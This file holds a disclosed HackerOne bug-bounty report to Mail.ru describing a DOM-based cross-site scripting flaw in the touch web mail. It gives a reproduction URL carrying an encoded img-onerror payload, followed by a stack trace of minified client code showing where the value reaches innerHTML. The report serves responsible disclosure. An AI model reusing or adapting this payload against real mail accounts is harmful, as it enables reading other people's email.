@@ -1,0 +1,68 @@
+ReportLink:https://hackerone.com/reports/344049
+WeaknessName:Cross-site Scripting (XSS) - DOM
+Reporter:https://hackerone.com/shafigullin
+ReportedTo:Mail.ru(mailru)
+BountyAmount:500.0
+Severity:
+State:Closed
+DateOfDisclosure:15.08.2018 16:30:04
+
+Summary:
+Browser specific DOM-based XSS in web mail for devices with touch interface.
+Domain, site, application
+--
+touch.mail.ru
+
+Testing environment
+--
+Mobile devices (tested on Chrome for iPad)
+
+Steps to reproduce
+--
+# login using Chrome in Chrome for iPad User-Agent
+# https://touch.mail.ru/messages/#sentmsg?Body=%3Cimg%20src%20onerror%3dalert(1)%3E
+
+Actual results
+--
+alert(1)
+
+Expected results, security impact description and recommendations
+--
+XSS
+
+PoC, exploit code, screenshots, video, references, additional resources
+--
+for some reason doesn't work if user agent is desktop, looking why
+
+stack
+```
+<x><img src onerror=alert(1)>
+val:function(e){if(_.indexOf(this._types,this._type)!=-1){var t=this.$elBody[this._type],a="",i="";switch(this._type){case LETTER_BODY_TYPE_HTML:i="innerHTML";break;case LETTER_BODY_TYPE_PLAIN:i="value";break}if(typeof e=="undefined"){a=t[0][i]}else{t[0][i]█=e}return a}else{return""}}
+r.val (https://img.imgsmail.ru/mail/touch/data/utf/ts/1524761284/touch/js/build/app.e.min.js:1:369207)
+
+[object Object], [object Object]
+render:function(){var e=this.model.toJSON(),t=false;if(d.status==STATUS_SUCCESS&&mailru.MrimDisabled){t=true}this.changeDisable(t);e.ext={};e.ExtInfo=c;this.$form[0].reset();this.$form.find('[name="files_id"]').val(e.files_id||"");this.$form.find('[name="as_msg"]').val(e.as_msg||"");this.$form.find('[name="message"]').val(e.message||"");this.$form.find('[name="re_msg"]').val(e.re_msg||"");this.$form.find('[name="fwd_msg"]').val(e.fwd_msg||"");this.$form.find('[name="draft_msg"]').val(e.draft_msg||"");this.$form.find(".letter__collector").toggleClass("letter__collector_open",!!(e.CC||e.BCC));this.$form.find(".js-params-state").html(e.Priority==1?"!":"");this.$form.find(".js-params-data").hide();this.$form.find('[name="subject"]').val(e.Subject||"");this.textBody.█val(e.Body||"");this._taggedTo.reset(e.To||"");this._taggedCc.reset(e.CC||"");this._taggedBcc.reset(e.BCC||"");this.$attach.html(this.attachListTpl({tmpl:"list",data:e,extend:{multiple:p()}}));this.$el.find(".js-error-message").html("");if(mailru.rb.attach){this.checkAttachList()}this.$localDraftList.empty();this.localDraftDraw();return this}
+render (https://img.imgsmail.ru/mail/touch/data/utf/ts/1524761284/touch/js/build/app.e.min.js:1:416648)
+
+change, [object Object], [object Object]
+trigger:function(e){var t,r,i,o,a,u,l;if(!(i=this._callbacks))return this;u=i.all;e=e.split(s);l=n.call(arguments,1);while(t=e.shift()){if(r=i[t]){o=r.tail;while((r=r.next)!==o){r.callback.█apply(r.context||this,l)}}if(r=u){o=r.tail;a=[t].concat(l);while((r=r.next)!==o){r.callback.apply(r.context||this,a)}}}return this}
+r.trigger (https://img.imgsmail.ru/mail/touch/data/utf/ts/1524761284/touch/js/build/libs.min.js:1:115892)
+
+[object Object]
+change:function(e){e||(e={});var t=this._changing;this._changing=true;for(var n in this._silent)this._pending[n]=true;var r=o.extend({},e.changes,this._silent);this._silent={};for(var n in r){this.trigger("change:"+n,this,this.get(n),e)}if(t)return this;while(!o.isEmpty(this._pending)){this._pending={};this.█trigger("change",this,e);for(var n in this.changed){if(this._pending[n]||this._silent[n])continue;delete this.changed[n]}this._previousAttributes=o.clone(this.attributes)}this._changing=false;return this}
+r.change (https://img.imgsmail.ru/mail/touch/data/utf/ts/1524761284/touch/js/build/libs.min.js:1:119521)
+
+[object Object]
+set:function(e,t,n){var r,i,a;if(o.isObject(e)||e==null){r=e;n=t}else{r={};r[e]=t}n||(n={});if(!r)return this;if(r instanceof l)r=r.attributes;if(n.unset)for(i in r)r[i]=void 0;if(!this._validate(r,n))return false;if(this.idAttribute in r)this.id=r[this.idAttribute];var s=n.changes={};var u=this.attributes;var c=this._escapedAttributes;var f=this._previousAttributes||{};for(i in r){a=r[i];if(!o.isEqual(u[i],a)||n.unset&&o.has(u,i)){delete c[i];(n.silent?this._silent:s)[i]=true}n.unset?delete u[i]:u[i]=a;if(!o.isEqual(f[i],a)||o.has(u,i)!=o.has(f,i)){this.changed[i]=a;if(!n.silent)this._pending[i]=true}else{delete this.changed[i];delete this._pending[i]}}if(!n.silent)this.█change(n);return this}
+r.set (https://img.imgsmail.ru/mail/touch/data/utf/ts/1524761284/touch/js/build/libs.min.js:1:117569)
+
+to, Body=%3Cx%3E%3Cimg%20src%20onerror%3dalert(1)%3E
+action:function(e,t){var i=this;if(patron.loaded){var s=this.compose.model,r=patron.genTimeCode(),n={};if(e=="replyAll"){n.reply="";n.all="1";n.replyall="1"}else{if(e=="draft"){n.drafts="1"}else if(e=="attach"){n.forward="attach"}else{n[e]="1"}}s.attributes={};if(e!="default"&&e!="support"&&e!="to"){var o=a.get(t.id);s.set(s.defaults).set({message:r},{silent:true});$('[name="message"]',this.$el).val(r);var l=function(){s.set({id:t.id},{silent:true}).fetch({data:n,success:function(){i.compose[e](s)},error:function(){alert(patron.lang["tpl.compose.ajax.notloaded"])}},{silent:true})};if(o&&o.isDataFully()){if(e!="attach"&&(!o.get("flags.attach")||_.indexOf(["reply","replyAll"],e)!=-1)&&e!="draft"){var c=function(e){var t="> ";var a=String(o.get(e)).replace(/__BODY_(QUOTED|PLAIN|HTML)*_*PLACEHOLDER__/,function(e,a){if(a=="HTML"){e=String(o.get("body.html"))}else if(a=="PLAIN"){e=String(o.get("body.text"))}else{e=t+String(o.get("body.text")).replace(/[\r\n]/g,"\n"+t)}return e});var s=i._getCurrentSignature(COMPOSE_EDIT_HTML);a=String(a).replace(/__SIGN_(QUOTED|PLAIN|HTML)*_*PLACEHOLDER__/g,s);a=String(a).replace(/__SUBJECT_PLACEHOLDER__/g,o.get("subject"));return a};switch(e){case"forward":s.set(s.defaults).set({To:"",From:patron.Utils.contactsToString(o.get("correspondents.from")),fwd_msg:o.get("id"),Subject:o.get("templates.forward.subject"),letbody_html:c("templates.forward.body.html"),letbody_plain:c("templates.forward.body.text"),MessageId:patron.genTimeCode()},{silent:true});if(patron.rb.os!=="iPhone OS"){setTimeout(function(){i.compose.$to.focus()},300)}break;case"reply":s.set(s.defaults).set({To:patron.Utils.contactsToString(o.get("replies.to")),re_msg:o.get("id"),Subject:o.get("templates.replay.subject"),letbody_html:c("templates.replay.body.html"),letbody_plain:c("templates.replay.body.text"),MessageId:patron.genTimeCode()},{silent:true});if(patron.rb.os!=="iPhone OS"){setTimeout(function(){i.compose.textBody.focus()},300)}break;case"replyAll":s.set(s.defaults).set({To:patron.Utils.contactsToString(o.get("replies.all")),Subject:o.get("templates.replay.subject"),CC:patron.Utils.contactsToString(o.get("replies.cc")),re_msg:o.get("id"),letbody_html:c("templates.replay.body.html"),letbody_plain:c("templates.replay.body.text"),MessageId:patron.genTimeCode()},{silent:true});if(patron.rb.os!=="iPhone OS"){setTimeout(function(){i.compose.textBody.focus()},300)}break}i.compose[e](s)}else{l()}}else{l()}}else{var u=_.clone(s.defaults);if(e!="support"){var d=i._getCurrentSignature(COMPOSE_EDIT_HTML);if(d!==""){d=(COMPOSE_EDIT_HTML?"<br />":"\n")+d}_.extend(u,{message:r,Body:d});if(e=="to"){_.each(String(t).split("&"),function(e){var t=String(e).split("=");if(t[0]&&t[1]){u[t[0]]=decodeURIComponent(t[1])}})}i.compose.localDraftNew();s.█set(u);if(patron.rb.os!=="iPhone OS"){setTimeout(function(){i.compose.$to.focus()},300)}}else{var f="\n\n\n\n";f+="-------\n";f+="Пожалуйста, не удаляйте, это нам очень поможет:\n";f+="Производитель: "+patron.rb.vendor+"\n";f+="ОС: "+patron.rb.os+" "+patron.rb.osver+"\n";f+="Модель: "+patron.rb.model+"\n";f+="userAgent: "+window.navigator.userAgent+" / "+patron.ability+" / s\n";f+="Region: ("+patron.RB_REGION_ID+", "+patron.RegionID+")\n";f+="Спасибо за внимание";_.extend(u,{To:"support@corp.mail.ru",Subject:"Новый интерфейс мобильной почты",Body:f});i.compose.localDraftNew();s.set(u);if(patron.rb.os!=="iPhone OS"){setTimeout(function(){i.compose.textBody.focus()},300)}}$('[name="message"]',this.$el).val(r)}}else{setTimeout(_.bind(this.action,this,e,t),200)}}
+r.action (https://img.imgsmail.ru/mail/touch/data/utf/ts/1524761284/touch/js/build/app.e.min.js:1:443769)
+```
+
+{F290965}
+
+## Impact
+
+attacker can read emails of my wife, she would be angry
